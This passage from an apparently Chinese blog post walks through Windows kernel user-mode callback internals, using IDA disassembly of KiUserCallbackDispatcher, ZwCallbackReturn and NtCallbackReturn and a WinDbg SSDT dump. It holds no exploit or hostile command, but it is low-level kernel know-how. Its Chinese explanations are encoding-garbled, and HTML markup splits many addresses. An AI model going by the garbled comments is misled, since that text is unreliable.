edi</span><br><span class="line">.text:<span class="number">005949</span>A0                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">005949</span>A3                 jmp     loc_594850      <span class="comment">// Eflags.VM</span></span><br><span class="line">.text:<span class="number">005949</span>A8 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949</span>A8</span><br><span class="line">.text:<span class="number">005949</span>A8 loc_5949A8:                             <span class="comment">// CODE XREF: sub_59437F+4E4â†‘j</span></span><br><span class="line">.text:<span class="number">005949</span>A8                 movzx   ebx, [ebp+_KTRAP_FRAME.TempSegCs] <span class="comment">// CS æœ€ä½ä½ä¸º0</span></span><br><span class="line">.text:<span class="number">005949</span>AC                 mov     [ebp+_KTRAP_FRAME.SegCs], ebx</span><br><span class="line">.text:<span class="number">005949</span>AF                 mov     ebx, [ebp+_KTRAP_FRAME.TempEsp]</span><br><span class="line">.text:<span class="number">005949B</span>2                 sub     ebx, <span class="number">0</span>Ch        <span class="comment">// ebx æŒ‡å‘ TrapFrame.DbgArgMark</span></span><br><span class="line">.text:<span class="number">005949B</span>5                 mov     [ebp+_KTRAP_FRAME.ErrCode], ebx</span><br><span class="line">.text:<span class="number">005949B</span>8                 mov     esi, [ebp+_KTRAP_FRAME.EFlags]</span><br><span class="line">.text:<span class="number">005949B</span>B                 mov     [ebx+<span class="number">8</span>], esi</span><br><span class="line">.text:<span class="number">005949B</span>E                 mov     esi, [ebp+_KTRAP_FRAME.SegCs]</span><br><span class="line">.text:<span class="number">005949</span>C1                 mov     [ebx+<span class="number">4</span>], esi</span><br><span class="line">.text:<span class="number">005949</span>C4                 mov     esi, [ebp+_KTRAP_FRAME._Eip]</span><br><span class="line">.text:<span class="number">005949</span>C7                 mov     [ebx], esi</span><br><span class="line">.text:<span class="number">005949</span>C9                 lea     esp, [ebp+_KTRAP_FRAME._Edi]</span><br><span class="line">.text:<span class="number">005949</span>CC                 pop     edi</span><br><span class="line">.text:<span class="number">005949</span>CD                 pop     esi</span><br><span class="line">.text:<span class="number">005949</span>CE                 pop     ebx</span><br><span class="line">.text:<span class="number">005949</span>CF                 pop     ebp</span><br><span class="line">.text:<span class="number">005949</span>D0                 mov     esp, [esp<span class="number">-60</span>h+arg_5C]</span><br><span class="line">.text:<span class="number">005949</span>D3                 iret</span><br><span class="line">.text:<span class="number">005949</span>D4 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949</span>D4</span><br><span class="line">.text:<span class="number">005949</span>D4 loc_5949D4:                             <span class="comment">// CODE XREF: sub_59437F+3A0â†‘j</span></span><br><span class="line">.text:<span class="number">005949</span>D4                 mov     eax, <span class="number">0</span>C0000005h</span><br><span class="line">.text:<span class="number">005949</span>D9                 jmp     _KiSystemServicePostCall@<span class="number">0</span> <span class="comment">// KiSystemServicePostCall()</span></span><br><span class="line">.text:<span class="number">005949</span>DE <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949</span>DE</span><br><span class="line">.text:<span class="number">005949</span>DE loc_5949DE:                             <span class="comment">// CODE XREF: sub_59437F+3DCâ†‘j</span></span><br><span class="line">.text:<span class="number">005949</span>DE                 push    large dword ptr fs:<span class="number">24</span>h</span><br><span class="line">.text:<span class="number">005949E5</span>                 mov     large byte ptr fs:<span class="number">24</span>h, <span class="number">0</span></span><br><span class="line">.text:<span class="number">005949</span>ED                 cli</span><br><span class="line">.text:<span class="number">005949</span>EE                 push    ebp</span><br><span class="line">.text:<span class="number">005949</span>EF                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">005949F</span>1                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">005949F</span>3                 push    eax</span><br><span class="line">.text:<span class="number">005949F</span>4                 push    ebx</span><br><span class="line">.text:<span class="number">005949F</span>5                 push    <span class="number">4</span>Ah</span><br><span class="line">.text:<span class="number">005949F</span>7                 call    _KiBugCheck2@<span class="number">24</span> <span class="comment">// KiBugCheck2(x,x,x,x,x,x)</span></span><br><span class="line">.text:<span class="number">005949F</span>C <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005949F</span>C</span><br><span class="line">.text:<span class="number">005949F</span>C loc_5949FC:                             <span class="comment">// CODE XREF: sub_59437F+3F2â†‘j</span></span><br><span class="line">.text:<span class="number">005949F</span>C                                         <span class="comment">// sub_59437F+400â†‘j</span></span><br><span class="line">.text:<span class="number">005949F</span>C                 movzx   eax, byte ptr [ecx+<span class="number">16</span>Ah]</span><br><span class="line">.text:<span class="number">00594</span>A03                 mov     edx, [ecx+<span class="number">13</span>Ch]</span><br><span class="line">.text:<span class="number">00594</span>A09                 push    ebp</span><br><span class="line">.text:<span class="number">00594</span>A0A                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">00594</span>A0C                 push    edx</span><br><span class="line">.text:<span class="number">00594</span>A0D                 push    eax</span><br><span class="line">.text:<span class="number">00594</span>A0E                 push    ebx</span><br><span class="line">.text:<span class="number">00594</span>A0F                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594</span>A11                 call    _KiBugCheck2@<span class="number">24</span> <span class="comment">// KiBugCheck2(x,x,x,x,x,x)</span></span><br><span class="line">.text:<span class="number">00594</span>A16 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594</span>A16                 retn</span><br><span class="line">.text:<span class="number">00594</span>A17 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594</span>A17</span><br><span class="line">.text:<span class="number">00594</span>A17 loc_594A17:                             <span class="comment">// CODE XREF: sub_59437F+3C4â†‘j</span></span><br><span class="line">.text:<span class="number">00594</span>A17                 mov     ecx, ebx</span><br><span class="line">.text:<span class="number">00594</span>A19                 call    @PerfInfoLogSysCallEntry@<span class="number">4</span> <span class="comment">// PerfInfoLogSysCallEntry(x)</span></span><br><span class="line">.text:<span class="number">00594</span>A1E                 jmp     loc_594749</span><br><span class="line">.text:<span class="number">00594</span>A23 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594</span>A23</span><br><span class="line">.text:<span class="number">00594</span>A23 loc_594A23:                             <span class="comment">// CODE XREF: sub_59437F+40Câ†‘j</span></span><br><span class="line">.text:<span class="number">00594</span>A23                 push    eax</span><br><span class="line">.text:<span class="number">00594</span>A24                 mov     ecx, eax</span><br><span class="line">.text:<span class="number">00594</span>A26                 call    @PerfInfoLogSysCallExit@<span class="number">4</span> <span class="comment">// PerfInfoLogSysCallExit(x)</span></span><br><span class="line">.text:<span class="number">00594</span>A2B                 pop     eax</span><br><span class="line">.text:<span class="number">00594</span>A2C                 jmp     loc_594791</span><br><span class="line">.text:<span class="number">00594</span>A2C sub_59437F      endp <span class="comment">// sp-analysis failed</span></span><br></pre></td></tr></table></figure>



<h3 id="4-5-KiUserCallbackDispatcherå‡½æ•°åˆ†æ"><a href="#4-5-KiUserCallbackDispatcherå‡½æ•°åˆ†æ" class="headerlink" title="4.5 KiUserCallbackDispatcherå‡½æ•°åˆ†æ"></a>4.5 KiUserCallbackDispatcherå‡½æ•°åˆ†æ</h3><p>è¯¥å‡½æ•°ä¸»è¦ï¼š</p>
<ol>
<li>å–åˆ°åœ¨ <code>KeUserModeCallback</code> å‡½æ•°æœ€åæ›´æ–°çš„ <code>TrapFrame.Esp3</code>ã€‚</li>
<li>å¡«å…… 3 ç¯å †æ ˆï¼ˆå‚è€ƒä¸‹é¢çš„å›¾ï¼‰ã€‚</li>
<li>å–åˆ°å †æ ˆä¸­çš„ <code>ApiNumber</code>ï¼Œç„¶åå» <code>PEB.KernelCallbackTable</code> å–åˆ°å›è°ƒå‡½æ•°çš„åœ°å€ã€‚</li>
<li>è°ƒç”¨å›è°ƒå‡½æ•°ã€‚</li>
<li>è°ƒç”¨ <code>ntdll!ZwCallbackReturn</code>ã€‚</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">// VOID KiUserCallbackDispatcher(</span></span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">//     IN PVOID CallbackArgument</span></span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">//     IN ULONG CallbackIndex</span></span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">//     )</span></span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670 <span class="comment">// __stdcall KiUserCallbackDispatcher(x, x, x)</span></span><br><span class="line">.text:<span class="number">6</span>A292670                 <span class="keyword">public</span> _KiUserCallbackDispatcher@<span class="number">12</span></span><br><span class="line">.text:<span class="number">6</span>A292670 _KiUserCallbackDispatcher@<span class="number">12</span> proc near  <span class="comment">// DATA XREF: .text:6A2036FCâ†‘o</span></span><br><span class="line">.text:<span class="number">6</span>A292670                                         <span class="comment">// .text:off_6A309FA8â†“o</span></span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670 arg_ExceptionList= dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">6</span>A292670 arg_10          = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">6</span>A292670</span><br><span class="line">.text:<span class="number">6</span>A292670                 cmp     _LdrDelegatedKiUserCallbackDispatcher, <span class="number">0</span></span><br><span class="line">.text:<span class="number">6</span>A292677                 jz      <span class="keyword">short</span> loc_6A292687</span><br><span class="line">.text:<span class="number">6</span>A292679                 mov     ecx, _LdrDelegatedKiUserCallbackDispatcher</span><br><span class="line">.text:<span class="number">6</span>A29267F                 call    ds:___guard_check_icall_fptr <span class="comment">// RtlpHpAppCompatDontChangePolicy()</span></span><br><span class="line">.text:<span class="number">6</span>A292685                 jmp     ecx</span><br><span class="line">.text:<span class="number">6</span>A292687 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">6</span>A292687</span><br><span class="line">.text:<span class="number">6</span>A292687 loc_6A292687:                           <span class="comment">// CODE XREF: KiUserCallbackDispatcher(x,x,x)+7â†‘j</span></span><br><span class="line">.text:<span class="number">6</span>A292687                 mov     ecx, large fs:_TEB</span><br><span class="line">.text:<span class="number">6</span>A29268E                 mov     edx, offset _KiUserCallbackExceptionHandler@<span class="number">16</span> <span class="comment">// KiUserCallbackExceptionHandler(x,x,x,x)</span></span><br><span class="line">.text:<span class="number">6</span>A292693                 lea     eax, [esp+arg_ExceptionList]</span><br><span class="line">.text:<span class="number">6</span>A292697                 mov     [esp+arg_ExceptionList], ecx <span class="comment">// å…ˆå°† 3 ç¯çš„å¼‚å¸¸é“¾æ¡ä¿å­˜èµ·æ¥</span></span><br><span class="line">.text:<span class="number">6</span>A29269B                 mov     [esp+arg_10], edx</span><br><span class="line">.text:<span class="number">6</span>A29269F                 mov     large fs:<span class="number">0</span>, eax <span class="comment">// ç„¶ååˆå°† 3 ç¯çš„å¼‚å¸¸é“¾æ¡å†™å›å»</span></span><br><span class="line">.text:<span class="number">6</span>A2926A5                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">6</span>A2926A8                 pop     edx             <span class="comment">// edi = ApiNumber</span></span><br><span class="line">.text:<span class="number">6</span>A2926A9                 mov     eax, large fs:_TEB.ProcessEnvironmentBlock <span class="comment">// eax = PEB</span></span><br><span class="line">.text:<span class="number">6</span>A2926AF                 mov     eax, [eax+_PEB.___u14.KernelCallbackTable]</span><br><span class="line">.text:<span class="number">6</span>A2926B2                 mov     ecx, [eax+edx*<span class="number">4</span>] <span class="comment">// ecx ä¸º 3 ç¯å›è°ƒå‡½æ•°åœ°å€</span></span><br><span class="line">.text:<span class="number">6</span>A2926B5                 call    ds:___guard_check_icall_fptr <span class="comment">// RtlpHpAppCompatDontChangePolicy()</span></span><br><span class="line">.text:<span class="number">6</span>A2926BB                 call    ecx</span><br><span class="line">.text:<span class="number">6</span>A2926BD                 push    eax</span><br><span class="line">.text:<span class="number">6</span>A2926BE                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">6</span>A2926C0                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                 call    _ZwCallbackReturn@<span class="number">12</span> <span class="comment">// NTSTATUS NTAPI ZwCallbackReturn(</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">//     _In_ PVOID Result,</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">//     _In_ ULONG ResultLength,</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">//     _In_ NTSTATUS Status</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">// )//</span></span><br><span class="line">.text:<span class="number">6</span>A2926C7                 mov     esi, eax</span><br><span class="line">.text:<span class="number">6</span>A2926C9</span><br><span class="line">.text:<span class="number">6</span>A2926C9 loc_6A2926C9:                           <span class="comment">// CODE XREF: .text:6A2926CFâ†“j</span></span><br><span class="line">.text:<span class="number">6</span>A2926C9                 push    esi</span><br><span class="line">.text:<span class="number">6</span>A2926CA                 call    _RtlRaiseStatus@<span class="number">4</span> <span class="comment">// RtlRaiseStatus(x)</span></span><br><span class="line">.text:<span class="number">6</span>A2926CA _KiUserCallbackDispatcher@<span class="number">12</span> endp <span class="comment">// sp-analysis failed</span></span><br></pre></td></tr></table></figure>



<p>å‡½æ•°å †æ ˆæƒ…å†µå¦‚ä¸‹ï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/18/ys8UjmzEFNYCoSv.png" alt="36.png"></p>
<h3 id="4-6-ZwCallbackReturn"><a href="#4-6-ZwCallbackReturn" class="headerlink" title="4.6 ZwCallbackReturn"></a>4.6 ZwCallbackReturn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">6</span>A291900 <span class="comment">// __stdcall ZwCallbackReturn(x, x, x)</span></span><br><span class="line">.text:<span class="number">6</span>A291900                 <span class="keyword">public</span> _ZwCallbackReturn@<span class="number">12</span></span><br><span class="line">.text:<span class="number">6</span>A291900 _ZwCallbackReturn@<span class="number">12</span> proc near          <span class="comment">// CODE XREF: KiUserCallbackExceptionHandler(x,x,x,x)+13â†“p</span></span><br><span class="line">.text:<span class="number">6</span>A291900                                         <span class="comment">// KiUserCallbackDispatcher(x,x,x)+52â†“p</span></span><br><span class="line">.text:<span class="number">6</span>A291900                                         <span class="comment">// DATA XREF: ...</span></span><br><span class="line">.text:<span class="number">6</span>A291900                 mov     eax, <span class="number">196</span>h       <span class="comment">// NtCallbackReturn</span></span><br><span class="line">.text:<span class="number">6</span>A291905                 call    sub_6A29190D</span><br><span class="line">.text:<span class="number">6</span>A29190A                 retn    <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">6</span>A29190A _ZwCallbackReturn@<span class="number">12</span> endp</span><br></pre></td></tr></table></figure>



<p><strong>SSDT</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">81721540</span>  <span class="number">81595</span>ab8 <span class="number">00000000</span> <span class="number">000001</span>d7 <span class="number">81596218</span></span><br><span class="line"><span class="number">81721550</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">kd&gt; dds <span class="number">81595</span>ab8+<span class="number">0x196</span>*<span class="number">4</span></span><br><span class="line">ReadVirtual: <span class="number">81596110</span> <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">81596110</span>  <span class="number">815959</span>cc nt!NtCallbackReturn</span><br><span class="line"><span class="number">81596114</span>  <span class="number">814</span>c6510 nt!NtAssociateWaitCompletionPacket</span><br><span class="line"><span class="number">81596118</span>  <span class="number">817f</span>ab22 nt!NtAssignProcessToJobObject</span><br><span class="line"><span class="number">8159611</span>c  <span class="number">8185e392</span> nt!NtAreMappedFilesTheSame</span><br><span class="line"><span class="number">81596120</span>  <span class="number">817</span>a5e9c nt!NtApphelpCacheControl</span><br><span class="line"><span class="number">81596124</span>  <span class="number">81823f</span>70 nt!NtAlpcSetInformation</span><br><span class="line"><span class="number">81596128</span>  <span class="number">8179f</span>7c0 nt!NtAlpcSendWaitReceivePort</span><br></pre></td></tr></table></figure>





<h3 id="4-7-NtCallbackReturn"><a href="#4-7-NtCallbackReturn" class="headerlink" title="4.7 NtCallbackReturn"></a>4.7 NtCallbackReturn</h3><p>è¯¥å‡½æ•°éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li><p><code>KTHREAD.InitialStack</code> å¦‚ä¸‹å›¾ï¼ˆåœ¨ <code>KiCalluserMode</code> ä¸­æ›´æ–°å¡«å……ï¼‰ï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png" alt="35.png"></p>
</li>
<li><p>ä¸Šå›¾ä¸­çš„ <code>ESP0</code> çš„ä½ç½®å¦‚ä¸‹ï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/18/NK7PhSsmqVbt12j.png" alt="37.png"></p>
<p>è¿™ä¸ª <code>ESP0</code>æ˜¯åœ¨å‡½æ•° <code>KiCallUserMode</code> ä¸­å‹å…¥çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>D770                 mov     ecx, [esp+<span class="number">10</span>h+arg_pPreviousThreadStackInfo]</span><br><span class="line">.text:<span class="number">0057</span>D774                 mov     [ecx+<span class="number">18</span>h], esp  <span class="comment">// ecxæŒ‡å‘KSTACK_CONTROLç»“æ„</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>æ›´æ–° <code>ESP0</code>ï¼šåœ¨å¦‚ä¸‹ä¸ºåªæ›´æ–°çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>DA1B                 lea     esp, [ecx+<span class="number">10</span>h]  <span class="comment">// æ­¤å¤„å­˜æ”¾CurrentThread.StackBase</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>è¿”å›ï¼šæ ¹æ®æ­¥éª¤2ï¼Œé‡Œé¢çš„è¿”å›åœ°å€æ˜¯åœ¨ <code>KeUserModeCallback</code> å‡½æ•°ä¸­ã€‚</p>
</li>
</ol>
<p>å‡½æ•°åˆ†æï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/18/93luQyKFrRcxiz1.png" alt="39.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>D9CC <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC <span class="comment">// NTSTATUS __stdcall NtCallbackReturn(PVOID Result, ULONG ResultLength, NTSTATUS Status)</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC _NtCallbackReturn@<span class="number">12</span> proc near          <span class="comment">// CODE XREF: sub_595471+4Bâ†“p</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC                                         <span class="comment">// DATA XREF: .text:0057E110â†“o</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC Result          = dword ptr  <span class="number">4</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC ResultLength    = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC Status          = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC                 mov     eax, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">0057</span>D9D2                 mov     ecx, [eax+_KTHREAD.InitialStack] <span class="comment">// æ­¤æ—¶InitialStackæŒ‡å‘KSTACK_CONTROL</span></span><br><span class="line">.text:<span class="number">0057</span>D9D5                 mov     edx, [ecx+<span class="number">18</span>h]  <span class="comment">// edx æŒ‡å‘åŸå…ˆçš„ESP0ï¼Œæ­¤æ—¶çš„esp0ä¸ºåˆšè¿›å…¥KiCallUserModeå‡½æ•°æ—¶</span></span><br><span class="line">.text:<span class="number">0057</span>D9D8                 test    edx, edx</span><br><span class="line">.text:<span class="number">0057</span>D9DA                 jz      loc_57DAAE      <span class="comment">// return STATUS_NO_CALLBACK_ACTIVE</span></span><br><span class="line">.text:<span class="number">0057</span>D9E0                 mov     ebx, eax        <span class="comment">// ebx = KTHREAD</span></span><br><span class="line">.text:<span class="number">0057</span>D9E2                 mov     esi, [esp+Result]</span><br><span class="line">.text:<span class="number">0057</span>D9E6                 mov     edi, [esp+ResultLength]</span><br><span class="line">.text:<span class="number">0057</span>D9EA                 mov     ebp, [edx+<span class="number">14</span>h]  <span class="comment">// ====================================================</span></span><br><span class="line">.text:<span class="number">0057</span>D9EA                                         <span class="comment">// edx æŒ‡å‘åŸå…ˆçš„ESP0ï¼Œæ­¤æ—¶çš„esp0ä¸ºåˆšè¿›å…¥KiCallUserModeå‡½æ•°æ—¶</span></span><br><span class="line">.text:<span class="number">0057</span>D9EA                                         <span class="comment">// åˆ™æ­¤æ—¶ esp0+0x14 åº”è¯¥ä¸ºKiCallUserModeçš„å‚æ•°OutputBuffer</span></span><br><span class="line">.text:<span class="number">0057</span>D9EA                                         <span class="comment">// ====================================================</span></span><br><span class="line">.text:<span class="number">0057</span>D9ED                 mov     eax, [edx+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">0057</span>D9F0                 mov     [ebp+<span class="number">0</span>], esi</span><br><span class="line">.text:<span class="number">0057</span>D9F3                 mov     [eax], edi      <span class="comment">// edx+18hä¸ºKiCallUserModeçš„å‚æ•°OutputLength</span></span><br><span class="line">.text:<span class="number">0057</span>D9F5                 mov     ebp, [ebx+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0057</span>D9F8                 mov     eax, [ecx+<span class="number">0</span>Ch]  <span class="comment">// ExceptionList(FS:[0])</span></span><br><span class="line">.text:<span class="number">0057</span>D9FB                 mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">.text:<span class="number">0057</span>DA01                 mov     ebp, [esp+Status]</span><br><span class="line">.text:<span class="number">0057</span>DA05                 mov     edi, [ecx+<span class="number">8</span>]    <span class="comment">// åŸå…ˆçš„ TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>DA08                 cmp     ebp, <span class="number">0</span>C0000423h <span class="comment">// STATUS_CALLBACK_POP_STACKï¼ˆA user mode unwind is in progress.ï¼‰</span></span><br><span class="line">.text:<span class="number">0057</span>DA08                                         <span class="comment">// ç”¨æˆ·æ¨¡å¼æ­£åœ¨å±•å¼€ä¸­ã€‚</span></span><br><span class="line">.text:<span class="number">0057</span>DA0E                 cli</span><br><span class="line">.text:<span class="number">0057</span>DA0F                 jz      <span class="keyword">short</span> loc_57DA60</span><br><span class="line">.text:<span class="number">0057</span>DA11</span><br><span class="line">.text:<span class="number">0057</span>DA11 loc_57DA11:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+B4â†“j</span></span><br><span class="line">.text:<span class="number">0057</span>DA11                 <span class="keyword">and</span>     [edi+_KTRAP_FRAME.Dr7], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0057</span>DA15                 test    [ebx+_KTHREAD.Header.___u0.__s6.DebugActive], <span class="number">0</span>DFh</span><br><span class="line">.text:<span class="number">0057</span>DA19                 jnz     <span class="keyword">short</span> loc_57DA82 <span class="comment">// å¤„ç†è°ƒè¯•å¯„å­˜å™¨DRx</span></span><br><span class="line">.text:<span class="number">0057</span>DA1B</span><br><span class="line">.text:<span class="number">0057</span>DA1B loc_57DA1B:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+DDâ†“j</span></span><br><span class="line">.text:<span class="number">0057</span>DA1B                 lea     esp, [ecx+<span class="number">10</span>h]  <span class="comment">// æ­¤å¤„å­˜æ”¾CurrentThread.StackBase</span></span><br><span class="line">.text:<span class="number">0057</span>DA1E                 test    byte ptr [edi+(_KTRAP_FRAME.EFlags+<span class="number">2</span>)], <span class="number">2</span> <span class="comment">// v86</span></span><br><span class="line">.text:<span class="number">0057</span>DA22                 lea     eax, [edi+<span class="number">8</span>Ch]  <span class="comment">// eax æŒ‡å‘ TrapFrame æœ€é«˜çš„ä½ç½®</span></span><br><span class="line">.text:<span class="number">0057</span>DA22                                         <span class="comment">// å› ä¸º TrapFrame æ€»å…±å¤§å° 0x8c</span></span><br><span class="line">.text:<span class="number">0057</span>DA28                 jnz     <span class="keyword">short</span> loc_57DA2D</span><br><span class="line">.text:<span class="number">0057</span>DA2A                 sub     eax, <span class="number">10</span>h        <span class="comment">// æ­¤æ—¶ eax æŒ‡å‘ TrapFrame.v86Es</span></span><br><span class="line">.text:<span class="number">0057</span>DA2D</span><br><span class="line">.text:<span class="number">0057</span>DA2D loc_57DA2D:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+5Câ†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>DA2D                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                 mov     large 